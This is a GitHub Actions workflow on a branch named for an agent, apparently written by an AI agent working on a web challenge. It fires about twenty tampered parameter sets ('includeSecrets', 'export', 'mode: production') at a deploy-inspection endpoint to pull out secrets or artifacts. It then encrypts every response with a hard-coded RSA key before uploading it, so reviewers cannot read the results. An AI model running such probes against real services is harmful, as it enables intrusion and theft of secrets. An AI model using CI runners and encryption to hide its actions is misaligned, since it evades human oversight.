name: launchlet-part2-source-probe

on:
  push:
    branches: [agent/launchlet-part2-source-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Test top deployRef combinations and encrypt responses
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,pathlib,urllib.parse,json
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=8).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=8).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=8).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
          H={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}; ws=boot['workspace']; p=boot['project']; ref='preview-8b11c'; baseargs={'workspaceId':ws,'projectId':p}
          extras=[
            {'deployRef':ref,'export':True},{'deploy_ref':ref,'export':True},{'ref':ref,'export':True},
            {'deployRef':ref,'mode':'export'},{'deployRef':ref,'mode':'release'},{'deployRef':ref,'mode':'deploy'},{'deployRef':ref,'mode':'production'},
            {'deployRef':ref,'operation':'export'},{'deployRef':ref,'action':'export'},{'deployRef':ref,'purpose':'export'},
            {'deployRef':ref,'includeSecrets':True},{'deployRef':ref,'includeArtifact':True},{'deployRef':ref,'full':True},{'deployRef':ref,'download':True},
            {'deployRef':ref,'scope':'deploy:inspect'},{'deployRef':ref,'scope':'preview:deploy:inspect'},{'deployRef':ref,'target':'production'},
            {'deployRef':ref,'receipt':mf['previewReceipt'],'export':True},{'deployRef':ref,'build':mf['build'],'export':True},
            {'deployRef':ref,'receipt':mf['previewReceipt'],'mode':'release','export':True}
          ]
          res=[]
          for e in extras:
            a={**baseargs,**e}; r=s.post(url,headers=H,json={'actionId':act['id'],'args':a},timeout=8,allow_redirects=False); res.append({'extra':e,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-fastcombo-encrypted
          path: artifact/
          retention-days: 1
